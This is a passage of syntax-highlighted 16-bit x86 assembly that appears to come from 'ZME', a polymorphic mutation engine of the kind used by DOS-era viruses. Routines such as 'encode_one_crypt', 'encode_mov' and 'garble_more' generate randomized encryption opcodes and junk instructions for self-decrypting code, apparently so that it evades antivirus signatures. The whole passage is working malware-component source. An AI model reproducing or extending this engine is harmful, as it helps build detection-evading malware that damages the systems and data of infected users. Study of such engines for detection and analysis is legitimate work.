        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">;add any shit after crypt data</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">choose_fake_mov</span><span class="sc0">  </span><span class="sc1">;al=C0(add), C8(or), D0(adc), F0(xor)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">MASKA</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110xx000</span><span class="sc0">         </span><span class="sc1">;al=C0(add), C8(or), D0(adc)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0">              </span><span class="sc1">;no al=D8(sbb)</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">-</span><span class="sc2">0F0h</span><span class="sc0">      </span><span class="sc1">;al := F0(xor)</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">choose_wr_and_encode_mov</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">  </span><span class="sc1">; register for call offset</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_mov</span><span class="sc0">          </span><span class="sc1">;cl-register; result - 1..4 byte stored</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">encode_zero_reg</span><span class="sc0">       </span><span class="sc1">;reg:=0, CF:=0, possible use 'ADC'</span><span class="sc0">
        </span><span class="sc5">STO_BYTE</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">;store ADD | OR | XOR  R,value</span><span class="sc0">
                                </span><span class="sc1">;future:</span><span class="sc0">
                                </span><span class="sc1">;lea reg,[reg+] ?</span><span class="sc0">
</span><span class="sc1">;        mov     protect_reg, al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_fake_mov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AX</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc1">; transcoding:</span><span class="sc0">
            </span><span class="sc1">; C0 -&gt;  5</span><span class="sc0">
            </span><span class="sc1">; C8 -&gt;  D</span><span class="sc0">
            </span><span class="sc1">; D0 -&gt; 15</span><span class="sc0">
            </span><span class="sc1">; F0 -&gt; 35</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">      </span><span class="sc1">;MOV R,value  db B8;</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">; ********</span><span class="sc0">
</span><span class="sc1">; zero reg</span><span class="sc0">
</span><span class="sc1">; add/adc/or/xor reg,mem</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_reg_mem</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;cl=4- 87 or 8B   mov r,[]</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_zero_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_fake_mov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">;adc</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_zero_reg</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">)+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc2">0C0h</span><span class="sc4">-</span><span class="sc2">87h</span><span class="sc0">    </span><span class="sc1">;3, b, 13, 33</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">;cl=2- 87 or 89   mov [],r</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0">          </span><span class="sc1">;cl=4- 87 or 8B   mov r,[]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000100b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.reg0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">R_BX</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111101b</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opSEGCS</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_add</span><span class="sc0">          </span><span class="sc1">;al-value, add reg0, value</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÑÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄ</span><span class="sc0">
</span><span class="sc1">; ³ ZME  ³      ENCODE ONE CRYPT OPERATION         ³</span><span class="sc0">
</span><span class="sc1">;ÍÏÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_one_crypt</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001110b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.lastgarble</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">force_choice_crypt_operation</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.lastgarble</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">encrypt_opcode_table</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeof_encrypt_opcode_table</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">encrypt_opcode_table</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;clear size data flag</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;clear size data flag</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; patch it into the top</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; this line unnecessary</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; byte for variable opcodes</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; byte for variable opcodes</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">R_M</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">R_M</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;lastchoose=1, 2, 3 ³ -1 ³ ax, cx, dx,</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">;al=lastchoose(1,2,3)+(0,4)-1= (0,1,2) or (4,5,6)</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc1">;        IF CRYPTLEVEL GT 8</span><span class="sc0">
            </span><span class="sc1">;;;;;;;;IF YOU HAVE ANY TROUBLE - UNCOMMENT THIS;</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_ENC</span><span class="sc0">        </span><span class="sc1">;SET USED 2..3</span><span class="sc0">
            </span><span class="sc1">;do not reg1 in r/m field if use two register</span><span class="sc0">
</span><span class="sc1">;        ENDIF</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11011011b</span><span class="sc0">    </span><span class="sc1">;don't use BP, SI, DI</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_register</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">M0D</span><span class="sc0">            </span><span class="sc1">;no use memory</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">M0D</span><span class="sc0">            </span><span class="sc1">;no use memory</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;use word</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111011b</span><span class="sc0">    </span><span class="sc1">;don't use BP, SI, DI</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AX</span><span class="sc0">
</span><span class="sc1">;    mov     ax, cx</span><span class="sc0">
    </span><span class="sc5">sto_word_</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">  </span><span class="sc1">;optimize for ax/al</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111110b</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc5">MASKA</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00xxx10x</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111110b</span><span class="sc0">    </span><span class="sc1">;al - high byte of opcode = ch</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">  </span><span class="sc1">;16 bit</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opNOP</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_INT_GARBL</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">garble_more</span><span class="sc0">  </span><span class="sc1">;0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">garble_more_AX</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">garble_more_reg_all</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">  </span><span class="sc1">;SET USED all registers</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">garble_more</span><span class="sc0">
